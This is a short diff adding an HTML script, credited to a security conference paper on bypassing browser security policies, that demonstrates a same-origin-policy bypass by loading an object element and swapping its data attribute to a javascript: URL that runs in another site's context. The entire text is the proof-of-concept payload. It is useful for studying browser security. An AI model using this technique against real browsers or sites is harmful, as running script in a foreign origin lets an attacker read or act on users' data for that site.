@@ -1,0 +1,8 @@
+<script>
+    window.onload = function () {
+        object = document.createElement("object"); object.setAttribute("data", "http://www.bing.com"); document.body.appendChild(object);
+        object.onload = function () {
+            object.setAttribute("data", "javascript:alert(document.domain)"); object.innerHTML = "foobar";
+        }
+    }
+</script> From asia-16-Baloch-Bypassing-Browser-Security-Policies-For-Fun-And-Profit-wp.pdf
